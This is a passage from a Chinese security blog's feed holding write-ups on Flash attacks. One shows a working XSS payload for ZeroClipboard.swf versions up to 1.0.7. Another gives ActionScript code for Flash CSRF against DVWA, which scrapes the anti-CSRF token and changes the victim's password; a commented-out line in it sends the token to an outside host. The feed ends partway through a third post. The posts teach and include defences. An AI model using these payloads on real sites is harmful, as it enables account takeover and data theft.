    <updated>2019-07-31T13:42:58.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ZeroClipboard简介"><a href="#0x01-ZeroClipboard简介" class="headerlink" title="0x01 ZeroClipboard简介"></a>0x01 ZeroClipboard简介</h2><p>ZeroClipboard是一款基于Flash的，兼容性较强的用于剪贴板复制的JS插件，它是基于Flash来实现跨浏览器的复制功能的。</p><p>ZeroClipboard是在国内网站中使用得比较普遍的Flash插件。</p><h2 id="0x02-Flash-XSS分析"><a href="#0x02-Flash-XSS分析" class="headerlink" title="0x02 Flash XSS分析"></a>0x02 Flash XSS分析</h2><p>当ZeroClipboard的版本&lt;=1.0.7时，会存在Flash XSS漏洞。</p><p>漏洞版本下载地址：<a href="https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard" target="_blank" rel="noopener">https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard</a></p><p>我们下载了ZeroClipboard.swf文件后，使用FFDec软件来对其进行反编译，得到as代码：</p><p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/1.png" alt=""></p><p>得到如下as源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.LoaderInfo;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.display.StageScaleMode;</span><br><span class="line">   import flash.events.Event;</span><br><span class="line">   import flash.events.MouseEvent;</span><br><span class="line">   import flash.external.ExternalInterface;</span><br><span class="line">   import flash.system.Security;</span><br><span class="line">   import flash.system.System;</span><br><span class="line">   </span><br><span class="line">   public class ZeroClipboard extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">      private var button:Sprite;</span><br><span class="line">      </span><br><span class="line">      private var id:String = &quot;&quot;;</span><br><span class="line">      </span><br><span class="line">      private var clipText:String = &quot;&quot;;</span><br><span class="line">      </span><br><span class="line">      public function ZeroClipboard()</span><br><span class="line">      &#123;</span><br><span class="line">         super();</span><br><span class="line">         stage.scaleMode = StageScaleMode.EXACT_FIT;</span><br><span class="line">         Security.allowDomain(&quot;*&quot;);</span><br><span class="line">         var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;</span><br><span class="line">         id = flashvars.id;</span><br><span class="line">         button = new Sprite();</span><br><span class="line">         button.buttonMode = true;</span><br><span class="line">         button.useHandCursor = true;</span><br><span class="line">         button.graphics.beginFill(13434624);</span><br><span class="line">         button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));</span><br><span class="line">         button.alpha = 0;</span><br><span class="line">         addChild(button);</span><br><span class="line">         button.addEventListener(MouseEvent.CLICK,clickHandler);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);</span><br><span class="line">         ExternalInterface.addCallback(&quot;setText&quot;,setText);</span><br><span class="line">         ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      public function setHandCursor(param1:Boolean) : *</span><br><span class="line">      &#123;</span><br><span class="line">         button.useHandCursor = param1;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      private function clickHandler(param1:Event) : void</span><br><span class="line">      &#123;</span><br><span class="line">         System.setClipboard(clipText);</span><br><span class="line">         ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;complete&quot;,clipText);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      public function setText(param1:*) : *</span><br><span class="line">      &#123;</span><br><span class="line">         clipText = param1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注重点放在ZeroClipboard()函数上。</p><p>接着，我们搜索是否存在有接受外部输入参数的关键字，这里我们找到了AS3的传参语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;</span><br></pre></td></tr></table></figure><p>跟踪下去，看看获取到传入的参数值的flashvars变量的调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id = flashvars.id;</span><br><span class="line">button = new Sprite();</span><br><span class="line">...  button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));</span><br></pre></td></tr></table></figure><p>可以看到，分别有id、width和height三个参数可以控制。传入参数id赋给了id变量，而其它两个参数则传入创建button按钮的宽和高，若不传的话会创建失败、无法执行到后续的代码逻辑中去。</p><p>这里继续跟踪id变量，可以看到都是作为ExternalInterface.call()函数的第二个参数传入的，当button成功创建并添加了一些监听事件后，在鼠标移动时就会触发且最后还会调用触发一次，此时就导致了Flash XSS漏洞的存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);</span><br><span class="line">ExternalInterface.addCallback(&quot;setText&quot;,setText);</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null);</span><br></pre></td></tr></table></figure><p>好了，最后理下，就是通过loaderInfo.parameters，我们可以传入三个参数id、width和height；其中width和height是必须传入的，否则进不了后续的代码逻辑；id参数则直接传入到ExternalInterface.call()函数的第二个参数执行，导致了Flash XSS漏洞的存在。</p><p>结合ExternalInterface.call()函数的第二个参数可控的payload，直接构造输入如下payload即可成功触发Flash XSS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&amp;width=100&amp;height=100</span><br></pre></td></tr></table></figure><p>这里只要你移动鼠标就会触发：</p><p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/2.png" alt=""></p><p>用IE的开发者工具调试可以看到实际执行JS代码如下，注入的内容成功闭合了后面的语句，造成XSS：</p><p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __flash__toXML(ZeroClipboard.dispatch(&quot;\\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&quot;,&quot;mouseOut&quot;,null)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure><p>这里多说一句，如果payload写成如下是不成功的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&quot;));alert(&apos;mi1k7ea&apos;);&#125;catch(e)&#123;&#125;//&amp;width=100&amp;height=100</span><br></pre></td></tr></table></figure><p>这是因为ZeroClipboard未定义，在之前alert前就会报错直接跳转到了catch代码段中执行，绕过了我们注入的XSS payload：</p><p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/4.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://joychou.org/web/flash-xss.html#directory072174797467736589" target="_blank" rel="noopener">Flash XSS Securit</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
  </entry>
  
  <entry>
    <title>Flash型CSRF总结</title>
    <link href="https://www.mi1k7ea.com/2019/07/28/Flash%E5%9E%8BCSRF%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/07/28/Flash型CSRF总结/</id>
    <published>2019-07-28T06:45:15.000Z</published>
    <updated>2019-07-29T15:50:56.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h2><p>Flash功能丰富，我们可以使用其API来向任意站点发送请求，而且发送的请求会继承当前浏览器的会话。换句话说，我们可以利用Flash而非JavaScript来控制浏览器向目标URL发送请求，从而实现Flash CSRF攻击。</p><p>我们知道，通过Flash请求外部资源时，会先访问外域是否存在crossdomain.xml且判断Flash当前域是否在allow-access-from标签配置的domain内。当domain的值为通配符*时，表明该站资源对所有外域开放，等同于舍弃了Flash层面的同源策略的限制。</p><p>Flash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。</p><h2 id="0x02-攻击场景"><a href="#0x02-攻击场景" class="headerlink" title="0x02 攻击场景"></a>0x02 攻击场景</h2><p>使用Flash来发起CSRF攻击，一般用于绕过一些特定情形，下面就列两个常见的。</p><h3 id="场景1——绕过Referer等HTTP头字段检测"><a href="#场景1——绕过Referer等HTTP头字段检测" class="headerlink" title="场景1——绕过Referer等HTTP头字段检测"></a>场景1——绕过Referer等HTTP头字段检测</h3><p>很多时候，Web站点后台会对Referer字段进行校验，但是有时候会出现未校验无Referer字段等情况的缺陷。</p><p>用Flash发起的CSRF，可以去掉HTTP头中的Referer字段，从而可以绕过校验Referer字段（但未校验空Referer）来防御CSRF攻击的机制。除此之外，还能去掉Origin字段。</p><p>攻击原理和CSRF一样的，只不过从经典的伪造表单变成了触发swf文件的形式：</p><ol><li>攻击者编写恶意的Flash文件，用于从目标敏感页面中获取受害者的敏感信息或者获取页面的token值；</li><li>攻击者将该Flash文件上传至自己的服务器中，并诱使受害者访问加载该恶意Flash文件的页面；</li><li>受害者访问目标敏感页面后，在同一浏览器中被诱使访问攻击者服务器加载了恶意Flash文件的页面，此时的访问是会带上受害者在目标页面的会话的；</li><li>由于无Referer字段，Bypass了目标站点后台的CSRF防御机制，成功获取到页面token或用户敏感信息，实现了CSRF攻击；</li></ol><p>下面举两个不同方式的Demo。</p><h4 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h4><p>首先攻击者发现目标站点的crossdomain.xml存在Flash型CSRF风险：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后攻击者编写恶意Flash，用于在目标页面进行危险敏感的GET操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function CSRF():void</span><br><span class="line">&#123;</span><br><span class="line">var urlLoader:URLLoader=new URLLoader();</span><br><span class="line">var request:URLRequest=new URLRequest();</span><br><span class="line">request.url=&quot;http://a.com/m7.php&quot;;</span><br><span class="line">request.method=URLRequestMethod.GET;</span><br><span class="line">request.data=&quot;user=admin&amp;msg=GET_secret_content&quot;;</span><br><span class="line">urlLoader.load(request);</span><br><span class="line">&#125;</span><br><span class="line">CSRF();</span><br></pre></td></tr></table></figure><p>编译为swf文件后放置到攻击者的Web目录，然后诱使受害者访问，即可向目标站点通过GET方式带上受害者当前访问该页面的浏览器会话来发送敏感操作的请求：</p><p><img src="/2019/07/28/Flash型CSRF总结/3.png" alt=""></p><p><img src="/2019/07/28/Flash型CSRF总结/1.png" alt=""></p><h4 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import flash.net.URLRequest;</span><br><span class="line">import flash.system.Security;</span><br><span class="line">var url = new URLRequest(&quot;http://a.com/m7.php&quot;);</span><br><span class="line">var shellcode = new URLVariables();</span><br><span class="line">shellcode = &quot;user=admin&amp;msg=POST_hacker_content&quot;;</span><br><span class="line">url.method = &quot;POST&quot;;</span><br><span class="line">url.data = shellcode;</span><br><span class="line">sendToURL(url);</span><br><span class="line">stop();</span><br></pre></td></tr></table></figure><p>诱使受害者访问攻击者的页面后，触发Flash向目标页面发起POST请求，进行危险的操作：</p><p><img src="/2019/07/28/Flash型CSRF总结/4.png" alt=""></p><p><img src="/2019/07/28/Flash型CSRF总结/2.png" alt=""></p><p>可以明显看到，请求报文并没有Referer字段。</p><h3 id="场景2——上传Flash到目标站点绕过crossdomain"><a href="#场景2——上传Flash到目标站点绕过crossdomain" class="headerlink" title="场景2——上传Flash到目标站点绕过crossdomain"></a>场景2——上传Flash到目标站点绕过crossdomain</h3><p>有个知识点——Flash并不关心扩展名或者Content-Type。如果使用object标签嵌入文件，只要文件内容为有效的Flash文件，它就会被当作是Flash文件来执行。</p><p>简单说下利用过程：</p><ol><li>攻击者发现目标站点的crossdomain.xml中domain设置并不为*，而是几个其他域名；</li><li>攻击者搜索几个白名单域名中的子域名，寻找可上传文件的域名，如victim.com中允许上传图片文件，但校验了文件后缀名和Content-Type；</li><li>攻击者创建恶意Flash文件，并修改后缀名为jpg，然后通过篡改Content-Type将其上传到victim.com中；</li><li>获取到上传文件的地址后，攻击者使用类型为application/x-shockwave-flash的object标签将文件嵌入到攻击者服务器中，如attacker.com；</li><li>受害者访问了victim.com，然后在同一浏览器中被诱使访问attacker.com，触发了攻击者上传的恶意Flash，从而可使攻击者窃取CSRF的token或目标站点页面的敏感信息，实现CSRF攻击；</li></ol><p>类似的payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span> = <span class="string">"height ：1px ; width ：1px ; "</span> <span class="attr">data</span> = <span class="string">"http://victim.com/user/2292/profilepicture.jpg"</span> <span class="attr">type</span> = <span class="string">"application / x-shockwave-flash"</span> <span class="attr">allowscriptaccess</span> = <span class="string">"always"</span> <span class="attr">flashvars</span> = <span class="string">"c = read＆u = http://victim.com/secret_file.txt"</span> &gt;</span> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实际攻击利用案例可直接看如下链接，该作者发现了Paypal的Flash CSRF漏洞并在YouTube上进行了漏洞利用的演示：</p><p><a href="https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html</a></p><h2 id="0x03-攻击案例"><a href="#0x03-攻击案例" class="headerlink" title="0x03 攻击案例"></a>0x03 攻击案例</h2><p>下面以DVWA的Low级和High级的场景为例进行Flash CSRF的攻击利用。</p><h3 id="GET型无Anti-CSRF-token"><a href="#GET型无Anti-CSRF-token" class="headerlink" title="GET型无Anti-CSRF token"></a>GET型无Anti-CSRF token</h3><p>我们知道，Low级的场景非常简单，表单参数通过GET方式传入，无CSRF-token防御机制，也无校验当前密码：</p><p><img src="/2019/07/28/Flash型CSRF总结/5.png" alt=""></p><p>首先，我们查看到目标站点是存在crossdomain.xml文件的，且domain设置为*，明显存在Flash CSRF风险：</p><p><img src="/2019/07/28/Flash型CSRF总结/6.png" alt=""></p><p>接着，我们根据前面看到的表单将前面场景1中的GET方式的代码稍微改下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function CSRF():void</span><br><span class="line">&#123;</span><br><span class="line">var urlLoader:URLLoader=new URLLoader();</span><br><span class="line">var request:URLRequest=new URLRequest();</span><br><span class="line">request.url=&quot;http://a.com/dvwa/vulnerabilities/csrf/index.php&quot;;</span><br><span class="line">request.method=URLRequestMethod.GET;</span><br><span class="line">request.data=&quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot;;</span><br><span class="line">urlLoader.load(request);</span><br><span class="line">&#125;</span><br><span class="line">CSRF();</span><br></pre></td></tr></table></figure><p>编译成swf文件后，放置到我们自己的服务器中，然后诱使受害者访问我们的恶意swf文件；如果受害者在此之前在同一浏览器中登录了目标站点，那么就会成功触发Flash CSRF攻击，从而密码被篡改：</p><p><img src="/2019/07/28/Flash型CSRF总结/7.png" alt=""></p><p>这里看到，受害者被诱导访问我们服务器上的恶意swf文件后，Flash先向目标服务器访问请求是否存在crossdomain.xml且是否允许当前域访问，当OK后就发送GET方式的恶意表单请求篡改密码。这里注意到右侧的HTTP头字段，由Flash发起的请求会带上用户的会话，Referer为Flash文件所在的地址，同时会添加一个x-flash-version字段用于标志Flash版本信息。</p><p>我们发送恶意链接诱使受害者点击访问，自己大概估算个受害者点击访问的时间后，使用admin/hacker用户名密码即可登录成功。</p><h3 id="GET型含Anti-CSRF-token"><a href="#GET型含Anti-CSRF-token" class="headerlink" title="GET型含Anti-CSRF token"></a>GET型含Anti-CSRF token</h3><p>在前面的基础上，High级添加了Anti-CSRF token机制，即在修改密码的表单处添加了一项隐藏的token，当用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求：</p><p><img src="/2019/07/28/Flash型CSRF总结/8.png" alt=""></p><p>这时就比Low级多了一步，需要先获取当前表单页面的Anti-CSRF token值，再一起发送篡改密码的请求。</p><p>这里我们编写恶意swf文件，主要添加了先让受害者请求表单页面，将返回的响应内容通过正则表达式来匹配出此时Anti-CSRF token的值，然后添加上token参数一同发送GET方式表单请求篡改密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//获取当前页面user_token</span><br><span class="line">var targetURL:String = &quot;http://192.168.43.201/dvwa/vulnerabilities/csrf/index.php&quot;;</span><br><span class="line">var request:URLRequest = new URLRequest(targetURL);</span><br><span class="line">request.method = URLRequestMethod.GET;</span><br><span class="line">request.data = &quot;&quot;;</span><br><span class="line">sendToURL(request);</span><br><span class="line">var loader:URLLoader=new URLLoader();</span><br><span class="line">loader.addEventListener(Event.COMPLETE,completeHandler);</span><br><span class="line">function completeHandler(event:Event):void&#123;</span><br><span class="line">var user_token:String = loader.data.match(&quot;user_token&apos; value=&apos;(.*?)&apos;&quot;)[1];</span><br><span class="line"></span><br><span class="line">//将token发回</span><br><span class="line">//var targetURL2:String = &quot;http://a.com/gettoken.php&quot;;</span><br><span class="line">//var request2:URLRequest = new URLRequest(targetURL2);</span><br><span class="line">//request2.method = URLRequestMethod.POST;</span><br><span class="line">//request2.data = &quot;user_token=&quot; + user_token;</span><br><span class="line">//sendToURL(request2);</span><br><span class="line"></span><br><span class="line">//发起CSRF攻击，篡改密码</span><br><span class="line">var request3:URLRequest = new URLRequest(targetURL);</span><br><span class="line">request3.method = URLRequestMethod.GET;</span><br><span class="line">request3.data = &quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot; + user_token;</span><br><span class="line">sendToURL(request3);</span><br><span class="line">&#125;</span><br><span class="line">loader.load(request);</span><br></pre></td></tr></table></figure><p>和Low级一样的原理，不再累赘，看看效果。</p><p>当受害者访问的是low.swf文件时，该文件时不带token的，会修改失败，302重定向回之前的页面：</p><p><img src="/2019/07/28/Flash型CSRF总结/9.png" alt=""></p><p>当受害者访问的是high.swf文件时，带上了token参数，成功进行了密码的篡改：</p><p><img src="/2019/07/28/Flash型CSRF总结/10.png" alt=""></p><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><p>检查网站的crossdomain.xml文件，如果allow-access-from标签中domain值设置为*则可能存在Flash CSRF漏洞；如果设置domain值为多个外域，需要人工分析是否存在风险。</p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><ul><li>当站点不需要跨域请求资源时，尽量删除crossdomain.xml文件；</li><li>若需crossdomain.xml文件，则必须严格设置allow-access-from标签中domain的白名单；</li></ul><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://labs.detectify.com/2014/05/20/the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website/" target="_blank" rel="noopener">The lesser known pitfalls of allowing file uploads on your website</a></p><p><a href="https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html" target="_blank" rel="noopener">crossdomain.xml : Beware of Wildcards</a></p><p><a href="http://www.vuln.cn/6205" target="_blank" rel="noopener">Flash CSRF – _Dy</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
      <category term="CSRF" scheme="https://www.mi1k7ea.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>Flash型XSS总结</title>
    <link href="https://www.mi1k7ea.com/2019/07/21/Flash%E5%9E%8BXSS%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/07/21/Flash型XSS小结/</id>
    <published>2019-07-21T15:04:06.000Z</published>
    <updated>2019-07-28T06:54:57.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="Flash与ActionScript"><a href="#Flash与ActionScript" class="headerlink" title="Flash与ActionScript"></a>Flash与ActionScript</h3><p>Flash（交互式矢量图和Web动画标准）是一种动画创作与应用程序开发于一身的创作软件。Adobe Flash Professional CC为创建数字动画、交互式Web站点、桌面应用程序以及手机应用程序开发提供了功能全面的创作和编辑环境。Flash广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。可以在Flash中创建原始内容或者从其它Adobe应用程序（如Photoshop或illustrator）导入它们，快速设计简单的动画，以及使用Adobe ActionScript 3.0开发高级的交互式项目。设计人员和开发人员可使用它来创建演示文稿、应用程序和其它允许用户交互的内容。Flash可以包含简单的动画、视频内容、复杂演示文稿和应用。</p><p>ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。</p><p>目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。</p><h3 id="swf文件的编译与反编译"><a href="#swf文件的编译与反编译" class="headerlink" title="swf文件的编译与反编译"></a>swf文件的编译与反编译</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>使用Flex SDK，直接去官网下载，解压后进入bin目录输入如<code>mxmlc c:\..\..\xx.as</code>的命令，注意其是依赖于32位的JDK。</p><p>当然，也可以使用Adobe Flash CS系列软件。</p><p>看个示例，编写个弹框的swf文件：</p><p>1、使用Flex SDK：</p><p>编写Mi1k7ea.as文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class 